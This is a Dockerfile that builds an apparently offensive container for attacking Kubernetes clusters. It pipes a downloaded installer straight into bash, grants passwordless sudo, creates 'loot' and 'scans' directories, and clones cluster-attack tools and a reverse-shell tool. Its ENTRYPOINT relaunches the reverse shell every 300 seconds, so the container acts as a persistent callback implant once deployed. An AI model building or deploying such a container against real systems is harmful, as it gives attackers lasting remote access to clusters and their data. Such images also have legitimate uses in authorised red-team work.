FROM ubuntu:latest

RUN apt update && apt install -y apt-utils 
RUN apt update && apt install -y \
	sudo \
	man \
	vim \
	git \
	tmux \
	autossh \
	asciinema \
	tar \
	wget \
	curl \
	httpie \
	netcat \
	socat \
	dnsutils \
	nmap \
	build-essential \
	python-pip \
	python3-pip \
	python-requests \
	python3-requests \
	ipython \
	ipython3 \
	ruby \
	golang \ 
	mongodb-clients \
	easy-rsa \
	ca-certificates

RUN curl -L -o /tmp/msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
RUN bash /tmp/msfinstall

RUN curl -L -o /usr/bin/kubectl https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
RUN chmod 755 /usr/bin/kubectl

RUN curl -L -o /tmp/etcd.tar.gz https://storage.googleapis.com/etcd/v3.3.13/etcd-v3.3.13-linux-amd64.tar.gz
RUN tar xvf /tmp/etcd.tar.gz -C /tmp
RUN cp /tmp/etcd-v3.3.13-linux-amd64/etcdctl /usr/bin/etcdctl
RUN chmod 755 /usr/bin/etcdctl

RUN curl -L -o /tmp/helm.tar.gz https://storage.googleapis.com/kubernetes-helm/helm-v2.14.0-linux-amd64.tar.gz
RUN tar xvf /tmp/helm.tar.gz -C /tmp
RUN cp /tmp/linux-amd64/helm /usr/bin/helm
RUN chmod 755 /usr/bin/helm

RUN useradd -m -s /bin/bash userx
RUN echo "userx    ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/userx && chmod 400 /etc/sudoers.d/userx

USER userx
WORKDIR /home/userx

RUN mkdir notes loot scans tools misc

RUN git clone https://github.com/jpbetz/auger.git tools/auger
RUN git clone https://github.com/aquasecurity/kube-hunter.git tools/kube-hunter
RUN git clone https://github.com/4ARMED/kubeletmein.git tools/kubeletmein

RUN git clone https://github.com/Doctor-love/revshell tools/revshell

ENTRYPOINT ["/bin/bash", "-c", "while true; do /home/userx/tools/revshell/revshell; sleep 300s; done"]
